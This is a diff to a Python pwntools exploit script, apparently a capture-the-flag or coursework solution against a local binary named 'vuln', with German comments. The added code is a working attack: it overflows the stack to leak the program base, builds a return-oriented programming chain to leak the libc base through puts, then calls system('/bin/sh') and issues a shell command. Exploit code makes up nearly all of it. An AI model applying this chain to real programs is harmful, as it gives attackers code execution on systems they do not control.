@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+from os import execv
 from pwn import *
 
 exe = context.binary = ELF("./vuln", checksec=False)
-
-# Sry was ill and did not have enough time 
-
-
+libc = ELF("/usr/lib/libc.so.6", checksec=False) # load libc; get via ldd vuln
+#context.log_level = "error"
 
 def start(argv=[], *a, **kw):
     gdbscript = """
@@ -28,17 +27,62 @@ def start(argv=[], *a, **kw):
 def main():
     io = start()
 
-    io.recv()
-    io.sendline(b"Nein")
-    io.recv()
+    # 1. Part get Exe Base Path
+    io.recvuntil(b":")
+    offset = 0x37 # da liegt main auf dem Stack 
+    io.sendline(cyclic(offset))
+    leakedAddr = io.recvuntil(b"data!")[28 + offset :34 + offset] # grep only die adresse
+    leakedAddr = u64(leakedAddr.ljust(8, b"\x00"))
+
+    exe.address = leakedAddr - exe.sym.main
+
+    log.info(f"Exe Addr: {hex(exe.address)}")
+
+    # Rop Chain die puts called, dann main ==> puts geleaked ==> libc base bekannt
 
     r = ROP(exe)
+
     r.call(exe.sym.puts, [exe.got.puts])
     r.call(exe.sym.main)
-    io.sendline(fit({264:r.chain()}))
-    print(io.recv())
-    
-    # add your exploit code here
+
+    offset = 0x108
+    io.sendline(fit({offset:r.chain()}))
+    leakedAddr = io.recvuntil(b":")[1:7]
+    leakedAddr = u64(leakedAddr.ljust(8, b"\x00"))
+
+    libc.address = leakedAddr - libc.sym["puts"]
+
+    log.info(f"LibC Base: {hex(libc.address)}")
+
+    io.sendline()
+    io.recvuntil(b"data!")
+
+    r = ROP(exe)
+
+    system = libc.sym.system
+    binsh = next(libc.search(b"/bin/sh"))
+
+    execve = libc.sym.execve
+
+    r.call(system, [binsh])
+    #r.call(execve, [b"/bin/sh -c", b'./execute_me_with_rop'])
+
+    print(r.dump())
+
+    offset = 0x108
+
+    io.sendline(fit({offset:r.chain()}))
+
+    io.recvline(timeout=0.2)
+
+    io.sendline(b"PABE=FUN ./execute_me_with_rop foo bar")
+    print(io.recvline().decode("utf-8")[:-1])
+    io.sendline(b"PABE=FUN ./execute_me_with_rop foo bar")
+
+    #io.interactive()
+
+
+
 
 if __name__ == "__main__":
     main()
